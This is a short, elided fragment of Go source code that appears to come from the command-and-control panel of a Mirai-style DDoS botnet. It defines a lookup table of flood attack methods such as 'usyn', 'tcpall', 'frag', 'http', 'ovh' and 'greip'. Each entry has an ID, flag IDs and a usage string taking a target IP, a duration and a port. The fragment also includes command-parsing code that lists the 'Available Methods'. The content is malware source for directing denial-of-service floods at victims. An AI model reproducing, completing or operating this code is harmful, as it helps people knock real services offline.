...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "usyn": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "usyn [ip] [time] dport=[port]",
    },
    "tcpall": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "tcpall [ip] [time] dport=[port]",
    },
    "frag": AttackInfo {
        4,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "frag [ip] [time] dport=[port]",
    },
    "asyn": AttackInfo {
        5,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "asyn [ip] [time] dport=[port]",
    },
    "plain": AttackInfo {
        6,
        []uint8 {0, 1, 7},
        "plain [ip] [time] dport=[port]",
    },
    "std": AttackInfo {
        7,
    ...
    "http": AttackInfo {
        ...
        "http [ip] [time] domain=[ip] conns=[300]",
    },
    "ovh": AttackInfo {
        9,
        []uint8 { 2, 7, 9, 5, 6, 7, 11, 12, 33, 14, 27 },
        "ovh [ip] [time] dport=[port]",
    },
    "greip": AttackInfo {
        10,
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" {
            validCmdList := "\x1b[0;91mAvailable Methods:\r\n\x1b[0;91m"
        ...
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[97;1m%s \033[31mis not a valid attack!", args[0]))
        }
